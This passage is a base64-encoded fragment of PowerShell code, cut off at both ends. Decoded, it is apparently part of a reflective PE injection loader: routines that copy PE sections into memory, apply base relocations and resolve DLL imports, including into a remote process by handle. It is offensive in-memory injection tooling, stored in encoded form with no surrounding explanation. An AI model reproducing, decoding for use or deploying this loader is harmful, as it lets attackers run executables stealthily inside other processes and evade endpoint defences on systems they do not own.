ZpY2VzLk1hcnNoYWxdOjpDb3B5KCRQRUJ5dGVzLCBbSW50MzJdJFNlY3Rpb25IZWFkZXIuUG9pbnRlclRvUmF3RGF0YSwgJFNlY3Rpb25EZXN0QWRkciwgJFNpemVPZlJhd0RhdGEpCiAgICAgICAgICAgIH0KICAgICAgICAKICAgICAgICAgICAgI0lmIFNpemVPZlJhd0RhdGEgaXMgbGVzcyB0aGFuIFZpcnR1YWxTaXplLCBzZXQgbWVtb3J5IHRvIDAgZm9yIHRoZSBleHRyYSBzcGFjZQogICAgICAgICAgICBpZiAoJFNlY3Rpb25IZWFkZXIuU2l6ZU9mUmF3RGF0YSAtbHQgJFNlY3Rpb25IZWFkZXIuVmlydHVhbFNpemUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICREaWZmZXJlbmNlID0gJFNlY3Rpb25IZWFkZXIuVmlydHVhbFNpemUgLSAkU2l6ZU9mUmF3RGF0YQogICAgICAgICAgICAgICAgW0ludFB0cl0kU3RhcnRBZGRyZXNzID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kU2VjdGlvbkRlc3RBZGRyKSAoW0ludDY0XSRTaXplT2ZSYXdEYXRhKSkKICAgICAgICAgICAgICAgIFRlc3QtTWVtb3J5UmFuZ2VWYWxpZCAtRGVidWdTdHJpbmcgIkNvcHktU2VjdGlvbnM6Ok1lbXNldCIgLVBFSW5mbyAkUEVJbmZvIC1TdGFydEFkZHJlc3MgJFN0YXJ0QWRkcmVzcyAtU2l6ZSAkRGlmZmVyZW5jZSB8IE91dC1OdWxsCiAgICAgICAgICAgICAgICAkV2luMzJGdW5jdGlvbnMubWVtc2V0Lkludm9rZSgkU3RhcnRBZGRyZXNzLCAwLCBbSW50UHRyXSREaWZmZXJlbmNlKSB8IE91dC1OdWxsCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgoKICAgIEZ1bmN0aW9uIFVwZGF0ZS1NZW1vcnlBZGRyZXNzZXMKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRQRUluZm8sCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbSW50NjRdCiAgICAgICAgJE9yaWdpbmFsSW1hZ2VCYXNlLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N5c3RlbS5PYmplY3RdCiAgICAgICAgJFdpbjMyQ29uc3RhbnRzLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N5c3RlbS5PYmplY3RdCiAgICAgICAgJFdpbjMyVHlwZXMKICAgICAgICApCiAgICAgICAgCiAgICAgICAgW0ludDY0XSRCYXNlRGlmZmVyZW5jZSA9IDAKICAgICAgICAkQWRkRGlmZmVyZW5jZSA9ICR0cnVlICNUcmFjayBpZiB0aGUgZGlmZmVyZW5jZSB2YXJpYWJsZSBzaG91bGQgYmUgYWRkZWQgb3Igc3VidHJhY3RlZCBmcm9tIHZhcmlhYmxlcwogICAgICAgIFtVSW50MzJdJEltYWdlQmFzZVJlbG9jU2l6ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9CQVNFX1JFTE9DQVRJT04pCiAgICAgICAgCiAgICAgICAgI0lmIHRoZSBQRSB3YXMgbG9hZGVkIHRvIGl0cyBleHBlY3RlZCBhZGRyZXNzIG9yIHRoZXJlIGFyZSBubyBlbnRyaWVzIGluIHRoZSBCYXNlUmVsb2NhdGlvblRhYmxlLCBub3RoaW5nIHRvIGRvCiAgICAgICAgaWYgKCgkT3JpZ2luYWxJbWFnZUJhc2UgLWVxIFtJbnQ2NF0kUEVJbmZvLkVmZmVjdGl2ZVBFSGFuZGxlKSBgCiAgICAgICAgICAgICAgICAtb3IgKCRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5CYXNlUmVsb2NhdGlvblRhYmxlLlNpemUgLWVxIDApKQogICAgICAgIHsKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgfQoKCiAgICAgICAgZWxzZWlmICgoQ29tcGFyZS1WYWwxR3JlYXRlclRoYW5WYWwyQXNVSW50ICgkT3JpZ2luYWxJbWFnZUJhc2UpICgkUEVJbmZvLkVmZmVjdGl2ZVBFSGFuZGxlKSkgLWVxICR0cnVlKQogICAgICAgIHsKICAgICAgICAgICAgJEJhc2VEaWZmZXJlbmNlID0gU3ViLVNpZ25lZEludEFzVW5zaWduZWQgKCRPcmlnaW5hbEltYWdlQmFzZSkgKCRQRUluZm8uRWZmZWN0aXZlUEVIYW5kbGUpCiAgICAgICAgICAgICRBZGREaWZmZXJlbmNlID0gJGZhbHNlCiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoKENvbXBhcmUtVmFsMUdyZWF0ZXJUaGFuVmFsMkFzVUludCAoJFBFSW5mby5FZmZlY3RpdmVQRUhhbmRsZSkgKCRPcmlnaW5hbEltYWdlQmFzZSkpIC1lcSAkdHJ1ZSkKICAgICAgICB7CiAgICAgICAgICAgICRCYXNlRGlmZmVyZW5jZSA9IFN1Yi1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVJbmZvLkVmZmVjdGl2ZVBFSGFuZGxlKSAoJE9yaWdpbmFsSW1hZ2VCYXNlKQogICAgICAgIH0KICAgICAgICAKICAgICAgICAjVXNlIHRoZSBJTUFHRV9CQVNFX1JFTE9DQVRJT04gc3RydWN0dXJlIHRvIGZpbmQgbWVtb3J5IGFkZHJlc3NlcyB3aGljaCBuZWVkIHRvIGJlIG1vZGlmaWVkCiAgICAgICAgW0ludFB0cl0kQmFzZVJlbG9jUHRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVJbmZvLlBFSGFuZGxlKSAoW0ludDY0XSRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5CYXNlUmVsb2NhdGlvblRhYmxlLlZpcnR1YWxBZGRyZXNzKSkKICAgICAgICB3aGlsZSgkdHJ1ZSkKICAgICAgICB7CiAgICAgICAgICAgICNJZiBTaXplT2ZCbG9jayA9PSAwLCB3ZSBhcmUgZG9uZQogICAgICAgICAgICAkQmFzZVJlbG9jYXRpb25UYWJsZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRCYXNlUmVsb2NQdHIsIFtUeXBlXSRXaW4zMlR5cGVzLklNQUdFX0JBU0VfUkVMT0NBVElPTikKCiAgICAgICAgICAgIGlmICgkQmFzZVJlbG9jYXRpb25UYWJsZS5TaXplT2ZCbG9jayAtZXEgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgW0ludFB0cl0kTWVtQWRkckJhc2UgPSBbSW50UHRyXShBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRQRUluZm8uUEVIYW5kbGUpIChbSW50NjRdJEJhc2VSZWxvY2F0aW9uVGFibGUuVmlydHVhbEFkZHJlc3MpKQogICAgICAgICAgICAkTnVtUmVsb2NhdGlvbnMgPSAoJEJhc2VSZWxvY2F0aW9uVGFibGUuU2l6ZU9mQmxvY2sgLSAkSW1hZ2VCYXNlUmVsb2NTaXplKSAvIDIKCiAgICAgICAgICAgICNMb29wIHRocm91Z2ggZWFjaCByZWxvY2F0aW9uCiAgICAgICAgICAgIGZvcigkaSA9IDA7ICRpIC1sdCAkTnVtUmVsb2NhdGlvbnM7ICRpKyspCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICNHZXQgaW5mbyBmb3IgdGhpcyByZWxvY2F0aW9uCiAgICAgICAgICAgICAgICAkUmVsb2NhdGlvbkluZm9QdHIgPSBbSW50UHRyXShBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludFB0cl0kQmFzZVJlbG9jUHRyKSAoW0ludDY0XSRJbWFnZUJhc2VSZWxvY1NpemUgKyAoMiAqICRpKSkpCiAgICAgICAgICAgICAgICBbVUludDE2XSRSZWxvY2F0aW9uSW5mbyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRSZWxvY2F0aW9uSW5mb1B0ciwgW1R5cGVdW1VJbnQxNl0pCgogICAgICAgICAgICAgICAgI0ZpcnN0IDQgYml0cyBpcyB0aGUgcmVsb2NhdGlvbiB0eXBlLCBsYXN0IDEyIGJpdHMgaXMgdGhlIGFkZHJlc3Mgb2Zmc2V0IGZyb20gJE1lbUFkZHJCYXNlCiAgICAgICAgICAgICAgICBbVUludDE2XSRSZWxvY09mZnNldCA9ICRSZWxvY2F0aW9uSW5mbyAtYmFuZCAweDBGRkYKICAgICAgICAgICAgICAgIFtVSW50MTZdJFJlbG9jVHlwZSA9ICRSZWxvY2F0aW9uSW5mbyAtYmFuZCAweEYwMDAKICAgICAgICAgICAgICAgIGZvciAoJGogPSAwOyAkaiAtbHQgMTI7ICRqKyspCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJFJlbG9jVHlwZSA9IFtNYXRoXTo6Rmxvb3IoJFJlbG9jVHlwZSAvIDIpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgI0ZvciBETEwncyB0aGVyZSBhcmUgdHdvIHR5cGVzIG9mIHJlbG9jYXRpb25zIHVzZWQgYWNjb3JkaW5nIHRvIHRoZSBmb2xsb3dpbmcgTVNETiBhcnRpY2xlLiBPbmUgZm9yIDY0Yml0IGFuZCBvbmUgZm9yIDMyYml0LgogICAgICAgICAgICAgICAgI1RoaXMgYXBwZWFycyB0byBiZSB0cnVlIGZvciBFWEUncyBhcyB3ZWxsLgogICAgICAgICAgICAgICAgIyAgIFNpdGU6IGh0dHA6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbWFnYXppbmUvY2MzMDE4MDguYXNweAogICAgICAgICAgICAgICAgaWYgKCgkUmVsb2NUeXBlIC1lcSAkV2luMzJDb25zdGFudHMuSU1BR0VfUkVMX0JBU0VEX0hJR0hMT1cpIGAKICAgICAgICAgICAgICAgICAgICAgICAgLW9yICgkUmVsb2NUeXBlIC1lcSAkV2luMzJDb25zdGFudHMuSU1BR0VfUkVMX0JBU0VEX0RJUjY0KSkKICAgICAgICAgICAgICAgIHsgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICNHZXQgdGhlIGN1cnJlbnQgbWVtb3J5IGFkZHJlc3MgYW5kIHVwZGF0ZSBpdCBiYXNlZCBvZmYgdGhlIGRpZmZlcmVuY2UgYmV0d2VlbiBQRSBleHBlY3RlZCBiYXNlIGFkZHJlc3MgYW5kIGFjdHVhbCBiYXNlIGFkZHJlc3MKICAgICAgICAgICAgICAgICAgICBbSW50UHRyXSRGaW5hbEFkZHIgPSBbSW50UHRyXShBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRNZW1BZGRyQmFzZSkgKFtJbnQ2NF0kUmVsb2NPZmZzZXQpKQogICAgICAgICAgICAgICAgICAgIFtJbnRQdHJdJEN1cnJBZGRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJEZpbmFsQWRkciwgW1R5cGVdW0ludFB0cl0pCiAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYgKCRBZGREaWZmZXJlbmNlIC1lcSAkdHJ1ZSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFtJbnRQdHJdJEN1cnJBZGRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kQ3VyckFkZHIpICgkQmFzZURpZmZlcmVuY2UpKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBbSW50UHRyXSRDdXJyQWRkciA9IFtJbnRQdHJdKFN1Yi1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJEN1cnJBZGRyKSAoJEJhc2VEaWZmZXJlbmNlKSkKICAgICAgICAgICAgICAgICAgICB9ICAgICAgICAgICAgICAgCgogICAgICAgICAgICAgICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRDdXJyQWRkciwgJEZpbmFsQWRkciwgJGZhbHNlKSB8IE91dC1OdWxsCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYgKCRSZWxvY1R5cGUgLW5lICRXaW4zMkNvbnN0YW50cy5JTUFHRV9SRUxfQkFTRURfQUJTT0xVVEUpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgI0lNQUdFX1JFTF9CQVNFRF9BQlNPTFVURSBpcyBqdXN0IHVzZWQgZm9yIHBhZGRpbmcsIHdlIGRvbid0IGFjdHVhbGx5IGRvIGFueXRoaW5nIHdpdGggaXQKICAgICAgICAgICAgICAgICAgICBUaHJvdyAiVW5rbm93biByZWxvY2F0aW9uIGZvdW5kLCByZWxvY2F0aW9uIHZhbHVlOiAkUmVsb2NUeXBlLCByZWxvY2F0aW9uaW5mbzogJFJlbG9jYXRpb25JbmZvIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAkQmFzZVJlbG9jUHRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kQmFzZVJlbG9jUHRyKSAoW0ludDY0XSRCYXNlUmVsb2NhdGlvblRhYmxlLlNpemVPZkJsb2NrKSkKICAgICAgICB9CiAgICB9CgoKICAgIEZ1bmN0aW9uIEltcG9ydC1EbGxJbXBvcnRzCiAgICB7CiAgICAgICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkUEVJbmZvLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N5c3RlbS5PYmplY3RdCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N5c3RlbS5PYmplY3RdCiAgICAgICAgJFdpbjMyVHlwZXMsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkV2luMzJDb25zdGFudHMsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDQsIE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW0ludFB0cl0KICAgICAgICAkUmVtb3RlUHJvY0hhbmRsZQogICAgICAgICkKICAgICAgICAKICAgICAgICAkUmVtb3RlTG9hZGluZyA9ICRmYWxzZQogICAgICAgIGlmICgkUEVJbmZvLlBFSGFuZGxlIC1uZSAkUEVJbmZvLkVmZmVjdGl2ZVBFSGFuZGxlKQogICAgICAgIHsKICAgICAgICAgICAgJFJlbW90ZUxvYWRpbmcgPSAkdHJ1ZQogICAgICAgIH0KICAgICAgICAKICAgICAgICBpZiAoJFBFSW5mby5JTUFHRV9OVF9IRUFERVJTLk9wdGlvbmFsSGVhZGVyLkltcG9ydFRhYmxlLlNpemUgLWd0IDApCiAgICAgICAgewogICAgICAgICAgICBbSW50UHRyXSRJbXBvcnREZXNjcmlwdG9yUHRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVJbmZvLlBFSGFuZGxlKSAoW0ludDY0XSRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5JbXBvcnRUYWJsZS5WaXJ0dWFsQWRkcmVzcykKICAgICAgICAgICAgCiAgICAgICAgICAgIHdoaWxlICgkdHJ1ZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEltcG9ydERlc2NyaXB0b3IgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkSW1wb3J0RGVzY3JpcHRvclB0ciwgW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfSU1QT1JUX0RFU0NSSVBUT1IpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICNJZiB0aGUgc3RydWN0dXJlIGlzIG51bGwsIGl0IHNpZ25hbHMgdGhhdCB0aGlzIGlzIHRoZSBlbmQgb2YgdGhlIGFycmF5CiAgICAgICAgICAgICAgICBpZiAoJEltcG9ydERlc2NyaXB0b3IuQ2hhcmFjdGVyaXN0aWNzIC1lcSAwIGAKICAgICAgICAgICAgICAgICAgICAgICAgLWFuZCAkSW1wb3J0RGVzY3JpcHRvci5GaXJzdFRodW5rIC1lcSAwIGAKICAgICAgICAgICAgICAgICAgICAgICAgLWFuZCAkSW1wb3J0RGVzY3JpcHRvci5Gb3J3YXJkZXJDaGFpbiAtZXEgMCBgCiAgICAgICAgICAgICAgICAgICAgICAgIC1hbmQgJEltcG9ydERlc2NyaXB0b3IuTmFtZSAtZXEgMCBgCiAgICAgICAgICAgICAgICAgICAgICAgIC1hbmQgJEltcG9ydERlc2NyaXB0b3IuVGltZURhdGVTdGFtcCAtZXEgMCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJEb25lIGltcG9ydGluZyBETEwgaW1wb3J0cyIKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICRJbXBvcnREbGxIYW5kbGUgPSBbSW50UHRyXTo6WmVybwogICAgICAgICAgICAgICAgJEltcG9ydERsbFBhdGhQdHIgPSAoQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVJbmZvLlBFSGFuZGxlKSAoW0ludDY0XSRJbXBvcnREZXNjcmlwdG9yLk5hbWUpKQogICAgICAgICAgICAgICAgJEltcG9ydERsbFBhdGggPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cmluZ0Fuc2koJEltcG9ydERsbFBhdGhQdHIpCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJJbXBvcnRpbmcgJEltcG9ydERsbFBhdGgiCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmICgkUmVtb3RlTG9hZGluZyAtZXEgJHRydWUpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJEltcG9ydERsbEhhbmRsZSA9IEltcG9ydC1EbGxJblJlbW90ZVByb2Nlc3MgLVJlbW90ZVByb2NIYW5kbGUgJFJlbW90ZVByb2NIYW5kbGUgLUltcG9ydERsbFBhdGhQdHIgJEltcG9ydERsbFBhdGhQdHIKICAgICAgICAgICAgICAgICAgICAjV3JpdGUtVmVyYm9zZSAiSW1wb3J0ZWQgJEltcG9ydERsbFBhdGggdG8gcmVtb3RlIHByb2Nlc3MiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJEltcG9ydERsbEhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5Mb2FkTGlicmFyeS5JbnZva2UoJEltcG9ydERsbFBhdGgpCiAgICAgICAgICAgICAgICAgICAgI1dyaXRlLVZlcmJvc2UgIkltcG9ydGVkICRJbXBvcnREbGxQYXRoIgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmICgoJEltcG9ydERsbEhhbmRsZSAtZXEgJG51bGwpIC1vciAoJEltcG9ydERsbEhhbmRsZSAtZXEgW0ludFB0cl06Olplcm8pKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHRocm93ICJFcnJvciBpbXBvcnRpbmcgRExMLCBETExOYW1lOiAkSW1wb3J0RGxsUGF0aCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgI0dldCB0aGUgZmlyc3QgdGh1bmssIHRoZW4gbG9vcCB0aHJvdWdoIGFsbCBvZiB0aGVtCiAgICAgICAgICAgICAgICBbSW50UHRyXSRUaHVua1JlZiA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVJbmZvLlBFSGFuZGxlKSAoJEltcG9ydERlc2NyaXB0b3IuRmlyc3RUaHVuaykKICAgICAgICAgICAgICAgIFtJbnRQdHJdJE9yaWdpbmFsVGh1bmtSZWYgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJFBFSW5mby5QRUhhbmRsZSkgKCRJbXBvcnREZXNjcmlwdG9yLkNoYXJhY3RlcmlzdGljcykgI0NoYXJhY3RlcmlzdGljcyBpcyBvdmVybG9hZGVkIHdpdGggT3JpZ2luYWxGaXJzdFRodW5rCiAgICAgICAgICAgICAgICBbSW50UHRyXSRPcmlnaW5hbFRodW5rUmVmVmFsID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJE9yaWdpbmFsVGh1bmtSZWYsIFtUeXBlXVtJbnRQdHJdKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB3aGlsZSAoJE9yaWdpbmFsVGh1bmtSZWZWYWwgLW5lIFtJbnRQdHJdOjpaZXJvKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRMb2FkQnlPcmRpbmFsID0gJGZhbHNlCiAgICAgICAgICAgICAgICAgICAgW0ludFB0cl0kUHJvY2VkdXJlTmFtZVB0ciA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgICAgICAgICAgICAgI0NvbXBhcmUgdGh1bmtSZWZWYWwgdG8gSU1BR0VfT1JESU5BTF9GTEFHLCB3aGljaCBpcyBkZWZpbmVkIGFzIDB4ODAwMDAwMDAgb3IgMHg4MDAwMDAwMDAwMDAwMDAwIGRlcGVuZGluZyBvbiAzMmJpdCBvciA2NGJpdAogICAgICAgICAgICAgICAgICAgICMgICBJZiB0aGUgdG9wIGJpdCBpcyBzZXQgb24gYW4gaW50LCBpdCB3aWxsIGJlIG5lZ2F0aXZlLCBzbyBpbnN0ZWFkIG9mIHdvcnJ5aW5nIGFib3V0IGNhc3RpbmcgdGhpcyB0byB1aW50CiAgICAgICAgICAgICAgICAgICAgIyAgIGFuZCBkb2luZyB0aGUgY29tcGFyaXNvbiwganVzdCBzZWUgaWYgaXQgaXMgbGVzcyB0aGFuIDAKICAgICAgICAgICAgICAgICAgICBbSW50UHRyXSROZXdUaHVua1JlZiA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgICAgICAgICAgICAgaWYoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKSAtZXEgNCAtYW5kIFtJbnQzMl0kT3JpZ2luYWxUaHVua1JlZlZhbCAtbHQgMCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFtJbnRQdHJdJFByb2NlZHVyZU5hbWVQdHIgPSBbSW50UHRyXSRPcmlnaW5hbFRodW5rUmVmVmFsIC1iYW5kIDB4ZmZmZiAjVGhpcyBpcyBhY3R1YWxseSBhIGxvb2t1cCBieSBvcmRpbmFsCiAgICAgICAgICAgICAgICAgICAgICAgICRMb2FkQnlPcmRpbmFsID0gJHRydWUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZWlmKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bSW50UHRyXSkgLWVxIDggLWFuZCBbSW50NjRdJE9yaWdpbmFsVGh1bmtSZWZWYWwgLWx0IDApCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBbSW50UHRyXSRQcm9jZWR1cmVOYW1lUHRyID0gW0ludDY0XSRPcmlnaW5hbFRodW5rUmVmVmFsIC1iYW5kIDB4ZmZmZiAjVGhpcyBpcyBhY3R1YWxseSBhIGxvb2t1cCBieSBvcmRpbmFsCiAgICAgICAgICAgICAgICAgICAgICAgICRMb2FkQnlPcmRpbmFsID0gJHRydWUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgW0ludFB0cl0kU3RyaW5nQWRkciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVJbmZvLlBFSGFuZGxlKSAoJE9yaWdpbmFsVGh1bmtSZWZWYWwpCiAgICAgICAgICAgICAgICAgICAgICAgICRTdHJpbmdBZGRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFN0cmluZ0FkZHIgKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bVUludDE2XSkpCiAgICAgICAgICAgICAgICAgICAgICAgICRQcm9jZWR1cmVOYW1lID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJpbmdBbnNpKCRTdHJpbmdBZGRyKQogICAgICAgICAgICAgICAgICAgICAgICAkUHJvY2VkdXJlTmFtZVB0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cmluZ1RvSEdsb2JhbEFuc2koJFByb2NlZHVyZU5hbWUpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmICgkUmVtb3RlTG9hZGluZyAtZXEgJHRydWUpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBbSW50UHRyXSROZXdUaHVua1JlZiA9IEdldC1SZW1vdGVQcm9jQWRkcmVzcyAtUmVtb3RlUHJvY0hhbmRsZSAkUmVtb3RlUHJvY0hhbmRsZSAtUmVtb3RlRGxsSGFuZGxlICRJbXBvcnREbGxIYW5kbGUgLUZ1bmN0aW9uTmFtZVB0ciAkUHJvY2VkdXJlTmFtZVB0ciAtTG9hZEJ5T3JkaW5hbCAkTG9hZEJ5T3JkaW5hbAogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgW0ludFB0cl0kTmV3VGh1bmtSZWYgPSAkV2luMzJGdW5jdGlvbnMuR2V0UHJvY0FkZHJlc3NJbnRQdHIuSW52b2tlKCRJbXBvcnREbGxIYW5kbGUsICRQcm9jZWR1cmVOYW1lUHRyKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJE5ld1RodW5rUmVmIC1lcSAkbnVsbCAtb3IgJE5ld1RodW5rUmVmIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkTG9hZEJ5T3JkaW5hbCkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgVGhyb3cgIk5ldyBmdW5jdGlvbiByZWZlcmVuY2UgaXMgbnVsbCwgdGhpcyBpcyBhbG1vc3QgY2VydGFpbmx5IGEgYnVnIGluIHRoaXMgc2NyaXB0LiBGdW5jdGlvbiBPcmRpbmFsOiAkUHJvY2VkdXJlTmFtZVB0ci4gRGxsOiAkSW1wb3J0RGxsUGF0aCIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRocm93ICJOZXcgZnVuY3Rpb24gcmVmZXJlbmNlIGlzIG51bGwsIHRoaXMgaXMgYWxtb3N0IGNlcnRhaW5seSBhIGJ1ZyBpbiB0aGlzIHNjcmlwdC4gRnVuY3Rpb246ICRQcm9jZWR1cmVOYW1lLiBEbGw6ICRJbXBvcnREbGxQYX